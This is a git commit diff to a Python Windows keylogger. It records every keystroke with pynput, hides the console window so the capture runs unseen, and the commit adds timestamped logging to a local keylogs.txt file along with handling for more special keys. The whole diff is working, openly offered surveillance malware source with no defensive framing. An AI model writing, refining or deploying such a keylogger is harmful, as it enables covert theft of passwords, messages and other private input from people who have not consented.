0342d15ba43bfa91f88818753b47dc5dffd74528
Rihad Roshan <152946208+rihadroshan@users.noreply.github.com>
2025-02-26 19:37:34 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,13 @@
 import subprocess
 import sys
+import os
 import win32console
 import win32gui
 from pynput import keyboard
+from datetime import datetime
+
+current_directory = os.path.dirname(os.path.abspath(__file__))
+log_file = os.path.join(current_directory, "keylogs.txt")
 
 class Keylogger:
     def __init__(self, keylog_file):
@@ -22,38 +27,44 @@ class Keylogger:
 
     def hide_console(self):
         win = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(win, 0)
+        if win != 0:
+            win32gui.ShowWindow(win, 0)
+
+    def log_key(self, keylog):
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        log_entry = f"[{timestamp}] {keylog}\n"
+        with open(self.keylog_file, 'a') as f:
+            f.write(log_entry)
 
     def on_press(self, key):
         try:
             if key == keyboard.Key.enter:
-                keylog = '\n'
+                keylog = '<ENTER>'
             elif key == keyboard.Key.backspace:
                 keylog = '<BACKSPACE>'
             elif key == keyboard.Key.space:
-                keylog = ' '
-            elif hasattr(key, 'char') and key.char is not None:
-                if key.char.isprintable():
-                    keylog = key.char
-                else:
-                    keylog = f'<{key.name}>'
+                keylog = '<SPACE>'
+            elif key == keyboard.Key.tab:
+                keylog = '<TAB>'
+            elif key == keyboard.Key.esc:
+                keylog = '<ESC>'
+            elif hasattr(key, 'char') and key.char:
+                keylog = key.char if key.char.isprintable() else f'<{key.name}>'
             else:
                 keylog = f'<{key.name}>'
         except AttributeError:
-            keylog = f'<{key.name}>'
-        
-        with open(self.keylog_file, 'a') as f:
-            f.write(keylog)
+            keylog = '<UNKNOWN_KEY>'
+
+        self.log_key(keylog)
 
     def on_release(self, key):
         pass
 
     def start(self):
+        print(f"Keylogger started. Logging to: {self.keylog_file}")
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
 
 if __name__ == "__main__":
-    # Specify the path where the keylogger output will be saved
-    keylog_file = r'c:\path\to\your\key.log'
-    keylogger = Keylogger(keylog_file)
+    keylogger = Keylogger(log_file)
     keylogger.start()
